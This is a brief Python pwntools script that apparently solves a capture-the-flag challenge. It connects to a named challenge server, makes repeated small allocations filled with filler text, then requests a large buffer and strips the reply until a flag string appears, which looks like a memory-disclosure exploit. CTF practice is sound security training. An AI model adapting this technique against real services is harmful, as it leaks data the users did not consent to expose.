
from pwn import *
HOST = 'ncsc.ccis.no'
PORT = 1343
a = ''
while "NCSC" not in a:

    r = remote(HOST,PORT)

    for i in range(5):
        r.recvuntil('>')
        r.send('1\n')
        r.recvuntil('?')
        r.send('512\n')
        r.recvline()
        a = 'give flag'* (10)
        r.send('{}\n'.format(a))

    r.recvuntil('>')

    r.send('2\n')

    r.recvuntil('?')

    r.send('2048\n')

    r.recvline()
    r.recvline()
    r.recvline()
    a = r.recvuntil('Put')
    r.recv()
    a= a.replace('\x00','').replace(' ','').replace('\n','')
    #print a

print a

print a

with open('test','w') as f:
    f.write(a)



